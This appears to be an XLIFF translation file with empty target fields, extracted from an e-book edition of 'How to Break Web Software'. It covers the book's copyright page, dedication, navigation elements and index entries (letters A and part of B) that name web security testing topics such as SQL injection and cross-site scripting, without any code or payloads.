          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="toc.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Copyright</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many of the designations used by manufacturers and sellers to distinguish their products are claimed as trademarks. Where those designations appear in this book, and the publisher was aware of a trademark claim, the designations have been printed with initial capital letters or in all capitals.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The authors and publisher have taken care in the preparation of this book, but make no expressed or implied warranty of any kind and assume no responsibility for errors or omissions. No liability is assumed for incidental or consequential damages in connection with or arising out of the use of the information or programs contained herein.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The publisher offers excellent discounts on this book when ordered in quantity for bulk purchases or special sales, which may include electronic versions and/or custom covers and content particular to your business, training goals, marketing focus, and branding interests. For more information, please contact:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;U.S.&amp;nbsp;Corporate&amp;nbsp;and&amp;nbsp;Government&amp;nbsp;Sales&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(800)&amp;nbsp;382-3419&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a class="docLink" href="mailto:corpsales@pearsontechgroup.com"&gt;corpsales@pearsontechgroup.com&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For sales outside the United States please contact:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;International&amp;nbsp;Sales&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a class="docLink" href="mailto:international@pearsoned.com"&gt;international@pearsoned.com&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Visit us on the Web: &lt;a class="docLink" target="_blank" href="http://www.awprofessional.com"&gt;www.awprofessional.com&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Copyright &amp;#169; 2006 Pearson Education, Inc.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All rights reserved. Printed in the United States of America. This publication is protected by copyright, and permission must be obtained from the publisher prior to any prohibited reproduction, storage in a retrieval system, or transmission in any form or by any means, electronic, mechanical, photocopying, recording, or likewise. For information regarding permissions, write to:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Pearson&amp;nbsp;Education,&amp;nbsp;Inc.&lt;br /&gt;Rights&amp;nbsp;and&amp;nbsp;Contracts&amp;nbsp;Department&lt;br /&gt;501&amp;nbsp;Boylston&amp;nbsp;Street,&amp;nbsp;Suite&amp;nbsp;900&lt;br /&gt;Boston,&amp;nbsp;MA&amp;nbsp;02116&lt;br /&gt;Fax:&amp;nbsp;(617)&amp;nbsp;671-3447</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>ISBN-13: 978-0-321-36944-4</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Text printed in the United States on recycled paper at R.R. Donnelley &amp;amp; Sons in Crawfordsville, IN.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Sixth printing, October 2008</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Library of Congress Cataloging-in-Publication Data</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Whittaker,&amp;nbsp;James&amp;nbsp;A.,&amp;nbsp;1965-&lt;br /&gt;&amp;nbsp;&amp;nbsp;How&amp;nbsp;to&amp;nbsp;break&amp;nbsp;Web&amp;nbsp;software&amp;nbsp;:&amp;nbsp;functional&amp;nbsp;and&amp;nbsp;security&amp;nbsp;testing&amp;nbsp;of&amp;nbsp;Web&amp;nbsp;applications&amp;nbsp;and&amp;nbsp;Web&amp;nbsp;services&amp;nbsp;/&amp;nbsp;James&amp;nbsp;Whittaker&amp;nbsp;&amp;amp;&amp;nbsp;Mike&amp;nbsp;Andrews.&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;p.&amp;nbsp;cm.&lt;br /&gt;&amp;nbsp;&amp;nbsp;ISBN&amp;nbsp;0-321-36944-0&amp;nbsp;(pbk.&amp;nbsp;:&amp;nbsp;alk.&amp;nbsp;paper)&amp;nbsp;&amp;nbsp;1.&amp;nbsp;&amp;nbsp;Computer&amp;nbsp;software&amp;mdash;Testing.&amp;nbsp;2.&amp;nbsp;&amp;nbsp;World&amp;nbsp;Wide&amp;nbsp;Web.&lt;br /&gt;3.&amp;nbsp;&amp;nbsp;Computer&amp;nbsp;networks&amp;mdash;Security&amp;nbsp;measures.&amp;nbsp;I.&amp;nbsp;Andrews,&amp;nbsp;Mike.&amp;nbsp;II.&amp;nbsp;Title.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;nbsp;&amp;nbsp;QA76.76.T48W485&amp;nbsp;2006&lt;br /&gt;&amp;nbsp;&amp;nbsp;005.1'4&amp;mdash;dc22&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2005034913</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Dedication</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>To Tara, who gives up so much and accepts so little.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&amp;mdash;Mike Andrews</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>For all of the fine security testers at Security Innovation who have taught me so much about the joy of breaking things.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&amp;mdash;James A. Whittaker</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="toc.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=A.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=SYMBOL.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html" style="font-weight:bold;"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch05lev1sec2.html#iddle1005"&gt; access control lists (ACLs)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1006"&gt; access restrictions&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1007"&gt; account.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1008"&gt; ACLs (Access Control Lists)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec9.html#iddle1009"&gt; ActiveX controls&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1010"&gt; Address Resolution Protocol (ARP)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1011"&gt; America Online (AOL)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec1.html#iddle1012"&gt; anonymity&lt;/a&gt;&lt;br /&gt;Apache&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1013"&gt; forcing weak cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1014"&gt; restricted users&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1015"&gt; application comments&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1016"&gt; ARP (Address Resolution Protocol)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1017"&gt; ASCII characters&lt;/a&gt;&lt;br /&gt;attacks&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;authentication&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;breaking authentication
 [See  &lt;a class="docLink" href="index&amp;amp;view=B.html#iddle1060"&gt;breaking authentication&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cross-site tracing
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1180"&gt;cross-site tracing&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fake cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1244"&gt;fake cryptography&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;forcing weak cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1263"&gt;forcing weak cryptography&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1022"&gt; form-based authentication&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1023"&gt; HTTP authentica-tion&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1024"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bypass client-side validation
 [See  &lt;a class="docLink" href="index&amp;amp;view=B.html#iddle1087"&gt;bypass client-side validation attacks&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bypass restrictions on input choices
 [See  &lt;a class="docLink" href="index&amp;amp;view=B.html#iddle1091"&gt;bypass restrictions on input choices&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;command injection
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1139"&gt;command injection&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;denial of service
 [See  &lt;a class="docLink" href="index&amp;amp;view=D.html#iddle1195"&gt;denial of service&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;directory traversal
 [See  &lt;a class="docLink" href="index&amp;amp;view=D.html#iddle1203"&gt;directory traversal&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1030"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fingerprinting the server
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1257"&gt;fingerprinting the server&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;guessing files and directories
 [See  &lt;a class="docLink" href="index&amp;amp;view=G.html#iddle1282"&gt;guessing files and directories&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;holes left by other people&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1033"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1034"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1035"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1036"&gt; reusing code&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;language-based attacks
 [See  &lt;a class="docLink" href="index&amp;amp;view=L.html#iddle1347"&gt;language-based attacks&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;panning for gold
 [See  &lt;a class="docLink" href="index&amp;amp;view=P.html#iddle1410"&gt;panning for gold&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1039"&gt; parameter tampering&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1040"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SQL injection II&amp;mdash;stored procedures
 [See  &lt;a class="docLink" href="index&amp;amp;view=S.html#iddle1548"&gt;SQL injection II&amp;mdash;stored procedures&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SQL injection
 [See  &lt;a class="docLink" href="index&amp;amp;view=S.html#iddle1540"&gt;SQL injection&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;state-based attacks
 [See  &lt;a class="docLink" href="index&amp;amp;view=S.html#iddle1561"&gt;state-based attacks&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1044"&gt; WSDL scanning attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1045"&gt; XPATHinjection attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;XSS
 [See  &lt;a class="docLink" href="index&amp;amp;view=X.html#iddle1724"&gt;XSS (cross-site scripting)&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1047"&gt; attributes, MAXLENGTH&lt;/a&gt;&lt;br /&gt;authentication&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;breaking authentication
 [See  &lt;a class="docLink" href="index&amp;amp;view=B.html#iddle1060"&gt;breaking authentication&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cross-site tracing
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1180"&gt;cross-site tracing&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fake cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1244"&gt;fake cryptography&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;forcing weak cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1263"&gt;forcing weak cryptography&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1052"&gt; form-based authentication&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1053"&gt; HTTP authentication&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1054"&gt; availability&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=SYMBOL.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=B.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=A.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html" style="font-weight:bold;"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
